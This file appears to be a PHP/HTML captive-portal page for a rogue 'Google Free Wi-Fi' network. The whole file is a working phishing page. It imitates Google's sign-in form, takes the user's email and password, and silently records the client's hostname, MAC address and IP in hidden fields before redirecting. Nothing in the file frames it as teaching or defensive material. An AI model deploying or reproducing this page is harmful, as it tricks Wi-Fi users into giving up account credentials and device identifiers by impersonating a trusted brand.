<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=394, user-scalable=no">
<title>Sign in - Google Free Wi-Fi</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
<link rel="stylesheet" type="text/css" href="assets/css/styles.css">
<link rel="icon" type="image/png" href="assets/img/f8593y1ses.png"/>

<script src="jquery-2.2.1.min.js"></script>
<script type="text/javascript">
  function redirect() {
    setTimeout(function() {
      window.location = "/captiveportal/index.php";
    }, 100);
  }
</script>

</head>
<body>
<form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
	<center><img src="assets/img/1ckkcu79ho.gif" alt="">
	<h1>Sign in</h1>
	<h2>with your Google Account</h2></center>
	<input id="user" type="text" name="email" placeholder="Enter your email"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	<input type="password" name="password" placeholder="Enter your password" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
	<input type="hidden" name="target" value="https://accounts.google.com/signin">
	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
	<p class="forgot"><a href="">Forgot email?</a></p>
	<p class="guest">Not your computer? Use Guest mode to sign in privately. <a class="learn" href="">Learn more</a></p>
	<p class="create"><a href="">Create Account</a></p><p class="button"><span class="text-right"><button type="submit">Next</button></span></p>
</form>
<footer>

	<p class="language">English (United States)</p><p class="arrow">🞃</p><br>
	<p class="help">Help</p><p class="privacy">Privacy</p><p class="terms">Terms</p>

</footer>
<script>document.onload = function() { document.getElementById("user").focus();};</script>
</body>
</html>
